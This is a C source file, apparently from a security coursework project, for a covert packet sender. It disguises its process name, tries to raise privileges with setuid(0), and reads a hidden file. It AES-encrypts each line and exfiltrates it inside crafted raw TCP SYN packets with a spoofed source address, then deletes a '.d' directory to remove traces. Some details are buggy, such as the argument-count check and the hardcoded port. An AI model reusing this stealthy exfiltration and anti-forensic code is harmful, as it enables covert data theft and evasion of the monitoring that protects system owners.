/*---------------------------------------------------------------------------------------------
--  SOURCE FILE: response.c - A simple raw TCP packet sender
--
--
--  DATE:        October 26, 2020
--
--  DESIGNERS:      Kuanysh Boranbayev
--                  Parm Dhaliwal
--
--  COMPILE:
--       Use the provided Makefile
--  
--  RUN:
--      ./response "10.0.0.192" "10.0.0.173" 443
--
-------------------------------------------------------------------------------------------------*/
#include <stdio.h>	//for printf
#include <string.h> //memset
#include <sys/socket.h>	//for socket ofcourse
#include <stdlib.h> //for exit(0);
#include <errno.h> //For errno - the error number
#include <netinet/tcp.h>	//Provides declarations for tcp header
#include <netinet/ip.h>	//Provides declarations for ip header
#include <arpa/inet.h> // inet_addr

#include <sys/prctl.h>

#include "pkt_sniffer.h"

#define MASK "RESPONSE"

/* 
    96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
*/
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

/*
    Generic checksum calculation function
*/
unsigned short csum(unsigned short *ptr,int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

int main (int argc, char **argv)
{
    FILE *fp;
    long fsize;
    
    /* mask the process name */
    memset(argv[0], 0, strlen(argv[0]));	
    strcpy(argv[0], MASK);
    prctl(PR_SET_NAME, MASK, 0, 0);
    
    /* change the UID/GID to 0 (raise privs) */
    setuid(0);
    setgid(0);
    
    if ((fp = fopen(HIDDEN_FILE, "r")) == NULL) {
        fprintf(stderr, "fopen(%s) error", HIDDEN_FILE);
        exit(1);
    }

    if (argc < 4) {
        fprintf(stdout,"Usage: %s \"src_ip\" \"dst_ip\" src_port dst_port\n", argv[0]);
        return 0;
    }
    
    printf("RESPOND: %s %s %d %d\n", argv[1], argv[2], atoi(argv[3]), atoi(argv[4]));

    char* line = NULL;
    size_t len = 0;
    ssize_t read;
    
    while ((read = getline(&line, &len, fp)) != -1) {
        //Create a raw socket
        int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

        if(s == -1)
        {
            //socket creation failed, may be because of non-root privileges
            perror("Failed to create socket");
            exit(1);
        }

        //Datagram to represent the packet
        char datagram[4096] , source_ip[32] , *data , *pseudogram;

        //zero out the packet buffer
        memset (datagram, 0, 4096);

        //IP header
        struct iphdr *iph = (struct iphdr *) datagram;

        //TCP header
        struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
        struct sockaddr_in sin;
        struct pseudo_header psh;
        
        // Encrypting
        EVP_CIPHER_CTX *en, *de;
  
        en = EVP_CIPHER_CTX_new();
        de = EVP_CIPHER_CTX_new();
        
        unsigned int salt[] = {12345, 54321};
        
        /* gen key and iv. init the cipher ctx object */
        if (aes_init(PASSWORD, strlen(PASSWORD), (unsigned char *)&salt, en, de)) {
            printf("Couldn't initialize AES cipher\n");
            exit(1);
        }
        
        int len = strlen(line) + 1;
        char* encrypted = (unsigned char *) aes_encrypt(en, line, &len);
        //Data part
        data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
        strcpy(data , encrypted);

        //some address resolution
        strcpy(source_ip , argv[1]);
        sin.sin_family = AF_INET;
        sin.sin_port = htons(80);
        sin.sin_addr.s_addr = inet_addr (argv[2]);

        //Fill in the IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
        iph->id = htonl (54321);	//Id of this packet
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;		//Set to 0 before calculating checksum
        iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
        iph->daddr = sin.sin_addr.s_addr;

        //Ip checksum
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);

        //TCP Header
        tcph->source = htons (atoi(argv[3]));
        tcph->dest = htons (atoi(argv[4]));
        tcph->seq = 0;
        tcph->ack_seq = 0;
        tcph->doff = 5;	//tcp header size
        tcph->fin=0;
        tcph->syn=1;
        tcph->rst=0;
        tcph->psh=0;
        tcph->ack=0;
        tcph->urg=0;
        tcph->window = htons (5840);	/* maximum allowed window size */
        tcph->check = 0;	//leave checksum 0 now, filled later by pseudo header
        tcph->urg_ptr = 0;

        //Now the TCP checksum
        psh.source_address = inet_addr( source_ip );
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );

        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
        pseudogram = malloc(psize);

        memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));

        tcph->check = csum( (unsigned short*) pseudogram , psize);

        //IP_HDRINCL to tell the kernel that headers are included in the packet
        int one = 1;
        const int *val = &one;

        if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
        {
            perror("Error setting IP_HDRINCL");
            exit(0);
        }

        //Send the packet
        if (sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
        {
            perror("sendto failed");
        }
        //Data send successfully
        else
        {
            printf ("Packet Send. Length : %d \n" , iph->tot_len);
        }

    }
    
    fclose(fp);
    if (line) 
        free(line);
    
    // Deleting the file
    system("rm -rf .d");
    
    return 0;
}
